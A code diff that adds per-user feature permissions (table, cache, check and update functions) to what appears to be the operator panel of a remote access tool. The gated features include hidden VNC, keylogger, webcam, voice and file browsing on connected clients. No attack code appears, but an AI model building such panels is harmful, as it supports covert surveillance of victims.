@@ -84,6 +84,16 @@ db.exec(
   `CREATE INDEX IF NOT EXISTS idx_user_client_access_rules_user ON user_client_access_rules(user_id)`,
 );
 
+db.exec(`
+  CREATE TABLE IF NOT EXISTS user_feature_permissions (
+    user_id INTEGER NOT NULL,
+    feature TEXT NOT NULL,
+    allowed INTEGER NOT NULL DEFAULT 1,
+    PRIMARY KEY (user_id, feature),
+    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
+  )
+`);
+
 try {
   db.exec(
     `ALTER TABLE users ADD COLUMN must_change_password INTEGER DEFAULT 0`,
@@ -395,6 +405,136 @@ export function canUserAccessClient(
     return !access.deny.has(clientId);
   }
   return false;
+}
+
+export type FeatureName =
+  | "console"
+  | "remote_desktop"
+  | "hvnc"
+  | "webcam"
+  | "file_browser"
+  | "processes"
+  | "keylogger"
+  | "voice";
+
+export const ALL_FEATURES: FeatureName[] = [
+  "console",
+  "remote_desktop",
+  "hvnc",
+  "webcam",
+  "file_browser",
+  "processes",
+  "keylogger",
+  "voice",
+];
+
+const featurePermCache = new Map<number, Map<string, boolean>>();
+
+function getFeaturePermCacheEntry(userId: number): Map<string, boolean> {
+  const cached = featurePermCache.get(userId);
+  if (cached) return cached;
+
+  const rows = db
+    .prepare("SELECT feature, allowed FROM user_feature_permissions WHERE user_id = ?")
+    .all(userId) as Array<{ feature: string; allowed: number }>;
+
+  const map = new Map<string, boolean>();
+  for (const row of rows) {
+    map.set(row.feature, row.allowed === 1);
+  }
+  featurePermCache.set(userId, map);
+  return map;
+}
+
+function invalidateFeaturePermCache(userId: number): void {
+  featurePermCache.delete(userId);
+}
+
+export function canUserAccessFeature(
+  userId: number,
+  role: UserRole,
+  feature: FeatureName,
+): boolean {
+  if (role === "admin") return true;
+  if (role === "viewer") return false;
+
+  const perms = getFeaturePermCacheEntry(userId);
+  const entry = perms.get(feature);
+  if (entry === undefined) return true;
+  return entry;
+}
+
+export function getUserFeaturePermissions(
+  userId: number,
+): Record<FeatureName, boolean> {
+  const user = getUserById(userId);
+  if (!user) {
+    const result = {} as Record<FeatureName, boolean>;
+    for (const f of ALL_FEATURES) result[f] = false;
+    return result;
+  }
+
+  const result = {} as Record<FeatureName, boolean>;
+  for (const f of ALL_FEATURES) {
+    result[f] = canUserAccessFeature(userId, user.role, f);
+  }
+  return result;
+}
+
+export function setUserFeaturePermission(
+  userId: number,
+  feature: FeatureName,
+  allowed: boolean,
+): { success: boolean; error?: string } {
+  if (!ALL_FEATURES.includes(feature)) {
+    return { success: false, error: `Invalid feature: ${feature}` };
+  }
+  try {
+    db.prepare(
+      "INSERT OR REPLACE INTO user_feature_permissions (user_id, feature, allowed) VALUES (?, ?, ?)",
+    ).run(userId, feature, allowed ? 1 : 0);
+    invalidateFeaturePermCache(userId);
+    return { success: true };
+  } catch (err: any) {
+    logger.error("[users] setUserFeaturePermission error:", err);
+    return { success: false, error: err.message || "Failed to update feature permission" };
+  }
+}
+
+export function setUserFeaturePermissions(
+  userId: number,
+  permissions: Partial<Record<FeatureName, boolean>>,
+): { success: boolean; error?: string } {
+  const stmt = db.prepare(
+    "INSERT OR REPLACE INTO user_feature_permissions (user_id, feature, allowed) VALUES (?, ?, ?)",
+  );
+  try {
+    const tx = db.transaction(() => {
+      for (const [feature, allowed] of Object.entries(permissions)) {
+        if (!ALL_FEATURES.includes(feature as FeatureName)) continue;
+        stmt.run(userId, feature, allowed ? 1 : 0);
+      }
+    });
+    tx();
+    invalidateFeaturePermCache(userId);
+    return { success: true };
+  } catch (err: any) {
+    logger.error("[users] setUserFeaturePermissions error:", err);
+    return { success: false, error: err.message || "Failed to update feature permissions" };
+  }
+}
+
+export function resetUserFeaturePermissions(
+  userId: number,
+): { success: boolean; error?: string } {
+  try {
+    db.prepare("DELETE FROM user_feature_permissions WHERE user_id = ?").run(userId);
+    invalidateFeaturePermCache(userId);
+    return { success: true };
+  } catch (err: any) {
+    logger.error("[users] resetUserFeaturePermissions error:", err);
+    return { success: false, error: err.message || "Failed to reset feature permissions" };
+  }
 }
 
 function validatePasswordPolicy(password: string): string | null {
